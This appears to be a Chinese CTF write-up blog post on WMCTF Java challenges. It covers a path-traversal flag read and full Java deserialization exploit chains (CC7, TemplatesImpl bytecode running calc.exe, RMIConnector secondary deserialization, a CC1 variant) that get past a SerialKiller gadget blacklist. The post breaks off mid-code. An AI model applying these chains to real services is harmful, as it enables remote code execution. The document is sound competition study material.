---
layout: post
title: WMCTF中java
categories: [blog ]
tags: [Java,]
description: "当时禁了非常多的类"
image:
  feature: windows.jpg
  credit: Azeril
  creditlink: azeril.com
 


---

![](/img/swirl/11.jpg)

# WMCTF

## AnyFileRead

首先分析AdminController路由

```java
@RequestMapping({"/admin"})
@Controller
/* loaded from: app.jar:BOOT-INF/classes/cc/saferoad/controller/AdminController.class */
public class AdminController {
    @GetMapping({"/*"})
    public String Manage() {
        return "manage";
    }

    @RequestMapping({"/{*path}"})
    @ResponseBody
    public void fileDownload(@PathVariable("path") String path, HttpServletResponse response) throws IOException {
        File file = new File("/tmp/" + path);
        InputStream fis = new BufferedInputStream(new FileInputStream(file));
        byte[] buffer = new byte[fis.available()];
        fis.read(buffer);
        fis.close();
        response.reset();
        response.setCharacterEncoding(UriEscape.DEFAULT_ENCODING);
        response.addHeader(HttpHeaders.CONTENT_DISPOSITION, "attachment;filename=" + URLEncoder.encode(path, UriEscape.DEFAULT_ENCODING));
        response.addHeader(HttpHeaders.CONTENT_LENGTH, "" + file.length());
        OutputStream outputStream = new BufferedOutputStream(response.getOutputStream());
        response.setContentType("application/octet-stream");
        outputStream.write(buffer);
        outputStream.flush();
    }
}
```

Java安全之Spring Security 5.6.3**绕过**

搜了好多文章也试了好多，但都绕不过去 %0a%0d

### 	SpringSecurityConfig

```java
public class SpringSecurityConfig extends WebSecurityConfigurerAdapter {
    @Bean
    public HttpFirewall httpFirewall() {
        return new CustomHttpFirewall();
    }

    @Override // org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter
    protected void configure(HttpSecurity httpSecurity) throws Exception {
        httpSecurity.authorizeRequests().antMatchers("/admin/**").authenticated();
    }
}
```

```java
  protected void configure(StrictHttpFirewall firewalledRequest) {
        firewalledRequest.setAllowUrlEncodedSlash(true);//允许URL路径中使用编码的斜杠
        firewalledRequest.setAllowUrlEncodedDoubleSlash(true);//允许使用双斜杠
        firewalledRequest.setAllowUrlEncodedPeriod(true);//允许URL路径中使用编码的句点
    }

```

![image-20230819174200675](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819174200675.png)

[浅谈SpringSecurity与CVE-2023-22602 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/640655127)

![image-20230819175751028](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819175751028.png)

所以说这道题

path为  ../flag

```
File file = new File("/tmp/" + path);
```

## ez_java_agagin

![image-20230819212638191](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819212638191.png)

扫完目录也就一个DS_store泄露并没什么有用的东西。

但是源码这两个url很奇怪，burp测一下功能

![image-20230819212840640](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819212840640.png)

一个只能读取图片，一个回显

must contain java and not have flag

![image-20230819212907045](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819212907045.png)

![image-20230819215225628](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819215225628.png)

![image-20230819222350800](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819222350800.png)

WMCTF{wowowowoowow_you_can_decode_meeeeee!}

## ez_java_rev

有用的就这一个类(就是有一个xml黑名单)

```java
@WebServlet(name = "CmdServlet", urlPatterns = {"/closetome"})
/* loaded from: Imagefile.class */
public class CmdServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    }

    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        String exp = req.getParameter("exp");
        byte[] b = Base64.getDecoder().decode(exp);
        ObjectInputStream ois = null;
        try {
            ois = new SerialKiller(new ByteArrayInputStream(b), "K:\\javafile\\wmctf-web\\src\\main\\resources\\serialkiller.xml");
        } catch (ConfigurationException e) {
            e.printStackTrace();
        }
        try {
            ois.readObject();
        } catch (ClassNotFoundException e2) {
            e2.printStackTrace();
        }
    }
}
```

正好前不久做了一道MRCTF的题差不多，但过滤的少都是用替代类ｆａｃｔｏｒｙ代替

这是我做的题是这样

```javascript
        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InvokerTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.ChainedTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.ConstantTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InstantiateTransformer$</regexp>
```

这道题的过滤是

```java
 <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InstantiateFactory$</regexp>
        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$</regexp>
        <regexp>org\.apache\.commons\.collections\.functorsFactoryTransformer$</regexp>
        <regexp>javax\.management\.BadAttributeValueExpException$</regexp>
        <regexp>org\.apache\.commons\.collections\.keyvalue\.TiedMapEntry$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.ChainedTransformer$</regexp>
        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TemplatesImpl$</regexp>
        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TrAXFilter$</regexp>
        <regexp>java\.security\.SignedObject$</regexp>
        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InstantiateFactory$</regexp>
        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$</regexp>
        <regexp>org\.apache\.commons\.collections\.functorsFactoryTransformer$</regexp>
```

```java
<config>
    <refresh>6000</refresh>
    <mode>
        <!--  set to 'false' for blocking mode  -->
        <profiling>false</profiling>
    </mode>
    <logging>
        <enabled>false</enabled>
    </logging>
    <blacklist>
        <!--  ysoserial's CommonsCollections1,3,5,6 payload   -->
        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InstantiateFactory$</regexp>
        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$</regexp>
        <regexp>org\.apache\.commons\.collections\.functorsFactoryTransformer$</regexp>
        <regexp>javax\.management\.BadAttributeValueExpException$</regexp>
        <regexp>org\.apache\.commons\.collections\.keyvalue\.TiedMapEntry$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.ChainedTransformer$</regexp>
        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TemplatesImpl$</regexp>
        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TrAXFilter$</regexp>
        <regexp>java\.security\.SignedObject$</regexp>
        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InstantiateFactory$</regexp>
        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$</regexp>
        <regexp>org\.apache\.commons\.collections\.functorsFactoryTransformer$</regexp>
        <!--  ysoserial's CommonsCollections2,4 payload   -->
        <regexp>org\.apache\.commons\.beanutils\.BeanComparator$</regexp>
        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
        <regexp>com\.sun\.rowset\.JdbcRowSetImpl$</regexp>
        <regexp>java\.rmi\.registry\.Registry$</regexp>
        <regexp>java\.rmi\.server\.ObjID$</regexp>
        <regexp>java\.rmi\.server\.RemoteObjectInvocationHandler$</regexp>
        <regexp>org\.springframework\.beans\.factory\.ObjectFactory$</regexp>
        <regexp>org\.springframework\.core\.SerializableTypeWrapper\$MethodInvokeTypeProvider$</regexp>
        <regexp>org\.springframework\.aop\.framework\.AdvisedSupport$</regexp>
        <regexp>org\.springframework\.aop\.target\.SingletonTargetSource$</regexp>
        <regexp>org\.springframework\.aop\.framework\.JdkDynamicAopProxy$</regexp>
        <regexp>org\.springframework\.core\.SerializableTypeWrapper\$TypeProvider$</regexp>
        <regexp>org\.springframework\.aop\.framework\.JdkDynamicAopProxy$</regexp>
        <regexp>java\.util\.PriorityQueue$</regexp>
        <regexp>java\.lang\.reflect\.Proxy$</regexp>
        <regexp>javax\.management\.MBeanServerInvocationHandler$</regexp>
        <regexp>javax\.management\.openmbean\.CompositeDataInvocationHandler$</regexp>
        <regexp>java\.beans\.EventHandler$</regexp>
        <regexp>java\.util\.Comparator$</regexp>
        <regexp>org\.reflections\.Reflections$</regexp>
    </blacklist>
    <whitelist>
        <regexp>.*</regexp>
    </whitelist>
</config>
```

打cc7这条链子的时候，发现只有chainedtransformer被禁了，本来想找它的替代类

但是找了一圈没找到，并且这个类还不能删了。

```java
commons-collections-3.2.1.jar
commons-compress-1.20.jar
commons-configuration-1.10.jar
commons-fileupload-1.4.jar
commons-io-2.5.jar
commons-lang-2.6.jar
commons-lang3-3.12.0.jar
commons-logging-1.2.jar
commons-logging-api-1.1.jar
commons-vfs2-2.0.jar
javassist-3.12.1.GA.jar
junrar-0.7.jar
maven-scm-api-1.4.jar
maven-scm-provider-svn-commons-1.4.jar
maven-scm-provider-svnexe-1.4.jar
plexus-utils-1.5.6.jar
regexp-1.3.jar
serialkiller-0.4.jar
xz-1.9.jar
```

### 赛后复现没有官方的ｗｐ但是在群里的✌说了一句cc7+RMI二次反序列化（整）

这里是用`invokerTransformer触发RMIconnect#connect方法`

接下来的思路就是跟着cc7一步步调试

```java
package com.ctf.help_me;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;



public class cc7 {
    public static void main(String[] args) throws Exception{
       //所以我直接找出cc7触发invoke的地方就可以了

//        Transformer[] transformers = {
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
//                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
//                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
//        };
//        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[0]);

//        HashMap<Object, Object> hashMap = new HashMap<>();
//        Map<Object, Object> lazymap1 = LazyMap.decorate(hashMap, new ConstantTransformer(1));
//        lazymap1.put("Aa", "value");
//
//        HashMap<Object, Object> hashMap1 = new HashMap<>();
//        Transformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
//
//        Map lazymap2 = LazyMap.decorate(hashMap1, transformer);
//        lazymap2.put("BB", "value");
//
//        Hashtable<Object, Object> objectObjectHashtable = new Hashtable<>();
//        objectObjectHashtable.put(lazymap1, 1);
//        objectObjectHashtable.put(lazymap2, 2);
//
//        lazymap2.remove("Aa");
//
//        Class<ChainedTransformer> chainedTransformerClass = ChainedTransformer.class;
//        Field iTransformers = chainedTransformerClass.getDeclaredField("iTransformers");
//        iTransformers.setAccessible(true);
//        iTransformers.set(transformer, transformer);
//
//        serialize(objectObjectHashtable);
//        unserialize("ser.bin");



        ByteArrayOutputStream tser = new ByteArrayOutputStream();
        ObjectOutputStream toser = new ObjectOutputStream(tser);
        toser.writeObject(getObject());
        toser.close();
        String exp= Base64.getEncoder().encodeToString(tser.toByteArray());
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
        setFieldValue(jmxServiceURL, "urlPath", "/stub/"+exp);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);
        invokerTransformer.transform(rmiConnector);




        ///  public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        //        super();
        //        iMethodName = methodName;
        //        iParamTypes = paramTypes;
        //        iArgs = args;
        //    }
//        public Object transform(Object input) {
//            if (input == null) {
//                return null;
//            }
//            try {
//                Class cls = input.getClass();
//                Method method = cls.getMethod(iMethodName, iParamTypes);
//                return method.invoke(input, iArgs);
     //   invokerTransformer.transform()




    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));
        return objectInputStream.readObject();
    }
    public static void setFieldValue(Object obj,String filename,Object newobj) throws NoSuchFieldException, IllegalAccessException {
        Field declaredField = obj.getClass().getDeclaredField(filename);
        declaredField.setAccessible(true);
        declaredField.set(obj,newobj);
    }
    public static byte[] getbyte() throws NotFoundException, CannotCompileException, IOException, javassist.NotFoundException {
        ClassPool classPool=new ClassPool(true);
        CtClass helloAbstract = classPool.makeClass("hello");
        CtClass ctClass = classPool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        helloAbstract.setSuperclass(ctClass);
        CtConstructor constructor=new CtConstructor(new CtClass[]{},helloAbstract);
        constructor.setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        //java.lang.Runtime.getRuntime().exec("calc");
        helloAbstract.addConstructor(constructor);
        byte[] bytes=helloAbstract.toBytecode();
        helloAbstract.detach();
        return bytes;

    }

    public static HashMap getObject() throws Exception{
        byte [] evilbtes=getbyte();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{evilbtes});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, obj);


        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry, "test");
        lazyMap.remove(obj);

        setFieldValue(lazyMap,"factory", transformer);

        return expMap;
    }
}
```

![image-20230910105232830](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230910105232830.png)

### 找谁调用了`transform `   （lazymap#get)

发现lazymap还没被过滤，那就用它

```java
 ByteArrayOutputStream tser = new ByteArrayOutputStream();
        ObjectOutputStream toser = new ObjectOutputStream(tser);
        toser.writeObject(getObject());
        toser.close();
        String exp= Base64.getEncoder().encodeToString(tser.toByteArray());
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
        setFieldValue(jmxServiceURL, "urlPath", "/stub/"+exp);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);
       // invokerTransformer.transform(rmiConnector);

        Map decorate = LazyMap.decorate(new HashMap(), invokerTransformer);
        decorate.get(rmiConnector);
```

### 继续找谁调用了lazymap（CC7使用了新的链Hashtable来触发lazyMap利用链）

此处进行详细分析

Hashtable有一个Entry<?,?>[]类型的table属性，并且还是一个数组，用于存放键值对。Hashtable在序列化时会把table数组的容量写入到序列化流中，再写入table数组中的元素个数，然后把table数组中的元素取出写入到序列化流中。

```java
    private void writeObject(java.io.ObjectOutputStream s) throws IOException {
		//临时变量（栈）
        Entry<Object, Object> entryStack = null;
 
        synchronized (this) {
            s.defaultWriteObject();
 
			//写入table的容量
            s.writeInt(table.length);
			//写入table的元素个数
            s.writeInt(count);
 
            //取出table中的元素，放入栈中（entryStack）
            for (int index = 0; index < table.length; index++) {
                Entry<?,?> entry = table[index];
 
                while (entry != null) {
                    entryStack =
                        new Entry<>(0, entry.key, entry.value, entryStack);
                    entry = entry.next;
                }
            }
        }
 
        //依次写入栈中的每个元素
        while (entryStack != null) {
            s.writeObject(entryStack.key);
            s.writeObject(entryStack.value);
            entryStack = entryStack.next;
        }
    }
```

再根据计算得到的length来创建table数组（origlength 和elements可以决定table数组的大小），然后从反序列化流中依次读取每个元素，然后调用reconstitutionPut方法将元素重新放入table数组（Hashtable的table属性），最终完成反序列化。

```java
	private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
        // Read in the length, threshold, and loadfactor
        s.defaultReadObject();
 
        // 读取table数组的容量
        int origlength = s.readInt();
		//读取table数组的元素个数
        int elements = s.readInt();
 
		//计算table数组的length
        int length = (int)(elements * loadFactor) + (elements / 20) + 3;
        if (length > elements && (length & 1) == 0)
            length--;
        if (origlength > 0 && length > origlength)
            length = origlength;
		//根据length创建table数组
        table = new Entry<?,?>[length];
        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
        count = 0;
 
		//反序列化，还原table数组
        for (; elements > 0; elements--) {
            @SuppressWarnings("unchecked")
                K key = (K)s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V)s.readObject();
            reconstitutionPut(table, key, value);
        }
    }
```

`重要的是reconstitutionPut这个方法`

只能大概分析出hashtable不允许数组重复，(var6.hash == var4 && var6.key.equals(var2))

只不过需要满足前面 键的hash值相同，然后后面就相等于  var6.key.equals(var2)      lazymap.equals(var2)

```java
    private void reconstitutionPut(Entry<?, ?>[] var1, K var2, V var3) throws StreamCorruptedException {
        if (var3 == null) {
            throw new StreamCorruptedException();
        } else {
            int var4 = var2.hashCode();
            int var5 = (var4 & Integer.MAX_VALUE) % var1.length;

            Entry var6;
            for(var6 = var1[var5]; var6 != null; var6 = var6.next) {
                if (var6.hash == var4 && var6.key.equals(var2)) {
                    throw new StreamCorruptedException();
                }
            }

            var6 = var1[var5];
            var1[var5] = new Entry(var4, var2, var3, var6);
            ++this.count;
        }
    }
```

但是自己调试发现没用chainedtransformer根本调不到

`出于好奇，问了问✌，之说换个调用get的方法`

为啥调用不到

![image-20230910155922671](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230910155922671.png)

![image-20230910160548433](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230910160548433.png)

![image-20230910160555390](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230910160555390.png)

![image-20230910160603849](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230910160603849.png)



![image-20230910160613511](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230910160613511.png)

前面需要hashtable那个key的hash相同，如果这样的话传入lazymap.get(这里面就是那个hash key)

比如就是下面这个 Aa和BB的hash相同，但是我们计划传入的是Rmiconnect这个对象，但是对象怎么可能hash相同

![image-20230910160901109](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230910160901109.png)





## 未完待续

```
就是想找一个能直接调用到 lazymap#get方法的
或者
找一个重新调用invokerTransformer transform的方法
```



## N天看✌们的文章结束（通过hashcode trick绕过——

参考别的师傅的一篇文章：https://baicany.github.io/2023/08/26/wmctf/

大概意思就是说hashcode，就是执行了一个异或运算，1^1=0  0^1=1

```
public final int hashCode() {
    return Objects.hashCode(this.key) ^ Objects.hashCode(this.value);
}
```

```
我们以往的让 hash相等,就是让key的hash相等然后value的就弄成一样的
map1.put("yy","JYcxk");
map1.put("zZ","JYcxk")

上面我们不是想过如何让rmiconnect这个对象的hash相等嘛，这里就可以直接
map1.put(rmiconnect,"yy")
map1.put("yy",rmiconnect)  


map2.put("zZ","yy");
map1.put("baicany","baicany");  这样也是相等的因为  zZ和yy的hash相等不就是1^1=0，baicany^baicany=0
```



```java
package com.ctf.help_me;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.SignedObject;
import java.util.*;


public class cc7 {
    public static void main(String[] args) throws Exception{

        ByteArrayOutputStream tser = new ByteArrayOutputStream();
        ObjectOutputStream toser = new ObjectOutputStream(tser);
        toser.writeObject(getObject());
        toser.close();
        String exp= Base64.getEncoder().encodeToString(tser.toByteArray());
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
        setFieldValue(jmxServiceURL, "urlPath", "/stub/"+exp);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);

        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);

//Hashtable --> equals--->lazymap#get --->Invoker..->RMIconnect#connect

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(innerMap1, invokerTransformer);
        lazyMap1.put("0", "yy");

        Map lazyMap2 = LazyMap.decorate(innerMap2,invokerTransformer);
        lazyMap2.put("yy", rmiConnector);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 1);
        lazyMap1.remove(rmiConnector);


        Field table = Class.forName("java.util.HashMap").getDeclaredField("table");
        table.setAccessible(true);
        Object[] array = (Object[])table.get(innerMap1);
        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node, rmiConnector);

        serialize(hashtable);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));
        return objectInputStream.readObject();
    }
    public static void setFieldValue(Object obj,String filename,Object newobj) throws NoSuchFieldException, IllegalAccessException {
        Field declaredField = obj.getClass().getDeclaredField(filename);
        declaredField.setAccessible(true);
        declaredField.set(obj,newobj);
    }
    public static byte[] getbyte() throws NotFoundException, CannotCompileException, IOException, javassist.NotFoundException {
        ClassPool classPool=new ClassPool(true);
        CtClass helloAbstract = classPool.makeClass("hello");
        CtClass ctClass = classPool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        helloAbstract.setSuperclass(ctClass);
        CtConstructor constructor=new CtConstructor(new CtClass[]{},helloAbstract);
        constructor.setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        //java.lang.Runtime.getRuntime().exec("calc");
        helloAbstract.addConstructor(constructor);
        byte[] bytes=helloAbstract.toBytecode();
        helloAbstract.detach();
        return bytes;

    }

    public static HashMap getObject() throws Exception{
        byte [] evilbtes=getbyte();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{evilbtes});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, obj);


        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry, "test");
        lazyMap.remove(obj);

        setFieldValue(lazyMap,"factory", transformer);

        return expMap;
    }

}
```

```java
这里后面的是什么，因为前面如果直接写的话序列化的时候就会弹出计算器，所以需要反射赋值
map1.put(rmiconnect,"yy")
map1.put("yy",rmiconnect) 

lazyMap1.put("0", "yy");
lazyMap2.put("yy", rmiConnector);  也就是这样

下面的语句是找到那个map中的lazymap1节点中的key，换成rmiconnector

Field table = Class.forName("java.util.HashMap").getDeclaredField("table");//table就是map中的node
        table.setAccessible(true);
        Object[] array = (Object[])table.get(innerMap1);
        Object node = array[0];//取的key
        if(node == null){
            node = array[1];
        }
        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node, rmiConnector);
  
```



## 这里再提一嘴，cc7的流程不是这样的

```java
package com.cc;
 
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
 
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
 
/*
        基于Hashtable的利用链
 */
public class CC7Test {
 
    public static void main(String[] args) throws Exception {
        //构造核心利用代码
        final Transformer transformerChain = new ChainedTransformer(new Transformer[0]);
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new String[]{"calc"}),
                new ConstantTransformer(1)};
 
        //使用Hashtable来构造利用链调用LazyMap
        Map hashMap1 = new HashMap();
        Map hashMap2 = new HashMap();
        Map lazyMap1 = LazyMap.decorate(hashMap1, transformerChain);
        lazyMap1.put("yy", 1);
        Map lazyMap2 = LazyMap.decorate(hashMap2, transformerChain);
        lazyMap2.put("zZ", 1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 1);
        lazyMap2.remove("yy");
        //输出两个元素的hash值
        System.out.println("lazyMap1 hashcode:" + lazyMap1.hashCode());
        System.out.println("lazyMap2 hashcode:" + lazyMap2.hashCode());
 
 
        //iTransformers = transformers（反射）
        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(transformerChain, transformers);
 
        //序列化  -->  反序列化（hashtable）
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashtable);
        oos.close();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
    }
}
```



 ```
 都是通过lazymap中的iTransformers是一个虚假的恶意类，然后最后反射替代
 reconstitutionPut方法在还原table数组时会调用equals方法判断重复元素，由于AbstractMap抽象类的equals方法校验的时候更为严格，会判断Map中元素的个数，由于lazyMap2和lazyMap1中的元素个数不一样则直接返回false，那么也就不会触发漏洞。
 
 因此在构造CC7利用链的payload代码时，Hashtable在添加第二个元素后，lazyMap2需要调用remove方法删除元素（yy=yy）才能触发漏洞。
 
 这里是因为lazymap2会存着lazymap1的键值对
 ```



## 参考另一个师傅给的方法(通过CC1 Transformered)

这是✌重新自己组装了条链子

```java
package com.ctf.help_me.Servlet;


import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.commons.collections.Predicate;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.bag.UnmodifiableBag;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.nibblesec.tools.SerialKiller;
import sun.reflect.ReflectionFactory;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import javax.swing.*;
import javax.swing.event.SwingPropertyChangeSupport;
import javax.swing.text.StyledEditorKit;
import java.awt.*;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.net.URLEncoder;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/**
 * Hello world!
 *
 */
public class Exp
{
    public static void main( String[] args ) throws Exception
    {

        RMIConnector rmiConnector = (RMIConnector) getObject();
//        rmiConnector.connect();=
        ConstantTransformer constantTransformer = new ConstantTransformer(rmiConnector);
        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);
        HashMap map = new HashMap();
        map.put("value","value");
        TransformedMap decorate1 = (TransformedMap) TransformedMap.decorate(map, null, invokerTransformer);
        TransformedMap decorate = (TransformedMap) TransformedMap.decorate(decorate1, null, constantTransformer);
        Class<?> name = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = name.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);//反射获得AnnotationInvocationHandle类
        Object o = declaredConstructor.newInstance(Target.class,decorate);
        serialize(o);
        unserialize();

//        ByteArrayOutputStream bao = new ByteArrayOutputStream();
//        new ObjectOutputStream(bao).writeObject(o);
//        System.out.println(URLEncoder.encode(Base64.encode(bao.toByteArray()).replaceAll("\\s*","")));
//
//
//
//
//        SerialKiller serialKiller = new SerialKiller(new ByteArrayInputStream(bao.toByteArray()), "K:\\javafile\\wmctf-web\\src\\main\\resources\\serialkiller.xml");
//        serialKiller.readObject();

    }

    public static Object getObject() throws Exception {//返回一个rmi二次反序列化对象

